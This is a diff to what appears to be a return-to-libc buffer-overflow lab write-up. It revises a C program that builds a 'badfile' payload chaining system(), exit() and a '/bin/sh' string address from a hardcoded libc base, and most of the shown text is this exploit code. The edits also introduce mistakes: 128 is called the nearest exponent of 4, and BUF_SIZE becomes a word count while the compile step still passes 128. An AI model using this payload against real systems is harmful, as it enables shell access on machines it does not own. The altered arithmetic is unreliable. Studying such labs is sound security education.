@@ -76,8 +76,9 @@ random with:
 echo $((RANDOM % 201))
 ```
 
-Which returned `138` and was rounded to `128`, the nearest exponent of `2`. I
-proceeded to compile `retlib.c` setting its `-DBUF_SIZE` flag:
+Which returned `138` and was rounded to `128`, the nearest exponent of `4`,
+which gives us 32 words in a 32-bit CPU. I proceeded to compile `retlib.c`
+setting its `-DBUF_SIZE` flag:
 
 ```bash
 gcc -DBUF_SIZE=128 -fno-stack-protector -z noexecstack \
@@ -219,24 +220,28 @@ address.
 #include <stdio.h>
 
 #ifndef BUF_SIZE
-#define BUF_SIZE 128
+#define BUF_SIZE 32 // 128 bytes in uint32
 #endif
-#define WORDSIZE 4
+
 typedef uint32_t addr_t;
+
+#define WORDSIZE sizeof(addr_t)
 
 int main(int argc, char **argv)
 {
-    char buf[BUF_SIZE + 6 * WORDSIZE] = {0};
+    char buf[(BUF_SIZE + 6) * WORDSIZE] = {0};
+
     FILE *badfile = fopen("./badfile", "w");
-    int offset = BUF_SIZE + 3 * WORDSIZE;  // = 140
+    int offset = (BUF_SIZE + 3) * WORDSIZE;  // = 140
 
-    addr_t system_addr = 0xb7e42da0;
-    addr_t exit_addr   = 0xb7e369d0;
-    addr_t sh_addr     = 0xb7f5d82b;
+    addr_t libc = 0xb7e08000;
+    addr_t system = libc + 0x3ada0;
+    addr_t exit   = libc + 0x2e9d0;
+    addr_t sh     = libc + 0x15b82b;
 
-    *(addr_t *)&buf[offset]                = system_addr;  // return address
-    *(addr_t *)&buf[offset + 1 * WORDSIZE] = exit_addr;    // system's return addr
-    *(addr_t *)&buf[offset + 2 * WORDSIZE] = sh_addr;      // system's argument
+    *(addr_t *)&buf[offset]                = system;
+    *(addr_t *)&buf[offset + 1 * WORDSIZE] = exit;
+    *(addr_t *)&buf[offset + 2 * WORDSIZE] = sh;
 
     fwrite(buf, sizeof(buf), 1, badfile);
     fclose(badfile);
